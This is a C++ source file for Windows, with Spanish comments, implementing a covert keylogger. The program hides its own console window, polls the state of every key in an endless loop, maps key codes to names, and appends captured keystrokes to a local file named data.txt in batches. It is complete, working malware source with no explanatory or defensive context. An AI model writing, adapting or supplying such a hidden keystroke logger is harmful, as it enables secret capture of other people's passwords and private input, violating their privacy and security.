#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <map>
#include <vector>


namespace keys{
const std::map<int, std::string> key_codes {
    {8, "BackSpace"},
    {9, "Tab"},
    {13, "Return"},
    {16, "Shift"},
    {17, "Control"},
    {18, "Alt"},
    {19, "Pause"},
    {20, "CapsLock"},
    {27, "Escape"},
    {32, "Space"},
    {33, "PageUp"},
    {34, "PageDown"},
    {35, "End"},
    {36, "Home"},
    {37, "Left"},
    {38, "Up"},
    {39, "Right"},
    {40, "Down"},
    {44, "PrintScreen"},
    {45, "Insert"},
    {46, "Delete"},
    {48, "0"},
    {49, "1"},
    {50, "2"},
    {51, "3"},
    {52, "4"},
    {53, "5"},
    {54, "6"},
    {55, "7"},
    {56, "8"},
    {57, "9"},
    {65, "A"},
    {66, "B"},
    {67, "C"},
    {68, "D"},
    {69, "E"},
    {70, "F"},
    {71, "G"},
    {72, "H"},
    {73, "I"},
    {74, "J"},
    {75, "K"},
    {76, "L"},
    {77, "M"},
    {78, "N"},
    {79, "O"},
    {80, "P"},
    {81, "Q"},
    {82, "R"},
    {83, "S"},
    {84, "T"},
    {85, "U"},
    {86, "V"},
    {87, "W"},
    {88, "X"},
    {89, "Y"},
    {90, "Z"},
    {91, "LWin"},
    {92, "RWin"},
    {93, "Apps"},
    {96, "NumPad0"},
    {97, "NumPad1"},
    {98, "NumPad2"},
    {99, "NumPad3"},
    {100, "NumPad4"},
    {101, "NumPad5"},
    {102, "NumPad6"},
    {103, "NumPad7"},
    {104, "NumPad8"},
    {105, "NumPad9"},
    {106, "Multiply"},
    {107, "Add"},
    {109, "Subtract"},
    {110, "Decimal"},
    {111, "Divide"},
    {112, "F1"},
    {113, "F2"},
    {114, "F3"},
    {115, "F4"},
    {116, "F5"},
    {117, "F6"},
    {118, "F7"},
    {119, "F8"},
    {120, "F9"},
    {121, "F10"},
    {122, "F11"},
    {123, "F12"},
    {124, "F13"},
    {125, "F14"},
    {126, "F15"},
    {127, "F16"},
    {144, "NumLock"},
    {145, "ScrollLock"},
    {160, "LShift"},
    {161, "RShift"},
    {162, "LControl"},
    {163, "RControl"},
    {164, "LAlt"},
    {165, "RAlt"},
    {186, "SemiColon"},
    {187, "Equals"},
    {188, "Comma"},
    {189, "UnderScore"},
    {190, "Period"},
    {191, "Slash"},
    {220, "BackSlash"},
    {221, "RightBrace"},
    {219, "LeftBrace"},
    {222, "Apostrophe"}
};
}



void save_data(std::vector<std::string>& data, const std::string& filePath){
    std::ofstream file(filePath, std::ios::app);

    if(file.is_open()){
        
        //escribimos los datos en el txt
        for(const auto& entry : data){
            if(entry == "Insert")
                file << entry << "\n";
            
            file << entry;
        }
        file.close();
        data.clear();
    }
}



int main(){
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    std::vector<std::string> buffer;

    while(true){ 
        for (int i = 0; i < 256; i++){
            //verificamos si el bit más significativo está a 1 (el valor es negativo)
            //lo que significa que la tecla está presionada
            if(GetAsyncKeyState(i) & 0x8000){
                auto it = keys::key_codes.find(i);

                if(it != keys::key_codes.end()){
                    buffer.push_back(it->second);
                    
                    if(buffer.size() >= 100)
                        save_data(buffer, "data.txt");
                }
            }
        }
        Sleep(10);
    }

    save_data(buffer, "data.txt");
    return 0;
}